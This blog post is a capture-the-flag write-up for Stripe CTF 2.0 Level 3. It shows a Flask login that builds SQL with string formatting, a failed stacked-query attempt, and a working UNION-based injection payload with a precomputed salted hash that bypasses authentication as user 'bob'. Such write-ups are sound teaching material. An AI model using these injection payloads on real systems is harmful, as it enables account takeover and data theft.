---
layout: post
title: Stripe Capture The Flag 2.0 - Problem 3
date: 2012-09-19 00:01
comments: true
categories: ctf
---

## Level 3

Finally we get to level 3. Here's the setup:

```
After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like Unbreakable Linux). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.

A beta version has launched with some interesting secrets (including the password to access Level 4)
```

Here's the code for the server (Python finally!)
{% gist 3747632 %}

...and here's the front-end:
{% gist 3747637 %}

From the description, we know that we need to break into bob's account to retrieve the password to level 4, although breaking into eve and mallory's accounts are attempting :) Afterall, who wouldn't want to know the proof of [P=NP](http://en.wikipedia.org/wiki/P_versus_NP_problem) or how to make a [perpetual motion machine](http://en.wikipedia.org/wiki/Perpetual_motion_machine)?

Anyhow, the front-end is a typical login page: you get username and password input fields, and they're sent off (via POST) to a server script. 
The server is a simple Flask app that gets the user input, checks them against a table of username and salted password hashes.

The `login()` function is where all the action takes place. Line 86 quickly caught my eyes:

```python
query = """SELECT id, password_hash, salt FROM users WHERE username = '{0}' LIMIT 1""".format(username)
cursor.execute(query)
```

This is an alarming pattern of formatting a string and sending it off to `cursor.execute()`. Python's string `format()` method is just another way of interopolation. It's exactly the same as `"""SELECT id, password_hash, salt FROM user WHERE username = %s""" % username"""`.

Now that we found the vulnerability, we need to find a way exploit it.

### Take 1

Normally, with SQL injection, you craft an input to terminate the previous statement, and inject the statement you want it to execute. Reading the code, it's getting the user's password hash and salt for the given user, and check it against the input hash and salt. The hashing method is [sha256](http://en.wikipedia.org/wiki/SHA-2). With Python, we can quickly pre-calculate a salted hash to inject. Here's an example, with password `1` and salt `a`.

```bash
python -c "import hashlib; print hashlib.sha256('1'+'a').hexdigest()"
```

and we get `a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65`.

The statement we really want it to execute is:

```sql
SELECT id, 'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username = 'bob'
```

so when we put '1' in the password input box, we will get the server to run sha246 on '1' + 'a', and check it against the hash that we fed in. The entire query gets executed wil look like this (with the middle line being the `username` we feed in):

```sql
SELECT id, password_hash, salt FROM users WHERE username = '
'; SELECT id,  'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username='bob
' LIMIT 1
```


How does that faire?

Unfortunately, we get a stack trace in the traceback:

```
Traceback (most recent call last):
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1689, in wsgi_app
    response = self.make_response(self.handle_exception(e))
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1687, in wsgi_app
    response = self.full_dispatch_request()
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1360, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1358, in full_dispatch_request
    rv = self.dispatch_request()
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1344, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "/Users/kevin/src/ctf/level03-code/secretvault.py", line 91, in login
    cursor.execute(query)Warning: You can only execute one statement at a time.
```

`cursor` cannot run more than one statement at a time! Smart, eh?

### Take 2

So the trick here is to use exactly 1 statement to inject our crafted data. We still want this to be returning the same fields. What if I `UNION` two queries, with the second query selecting the injected data?

So something like this (the middle line is the one we inject as `username`):

```sql
SELECT id, password_hash, salt FROM users WHERE username = '
bob' UNION select id, 'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username = 'bob
' LIMIT 1
```

Submit, and boom:

```
Welcome back! Your secret is: "..." (Log out)
```

## Conclusion

This is a canonical SQL injection. Again, NEVER trust user input. Always sanitize user input.
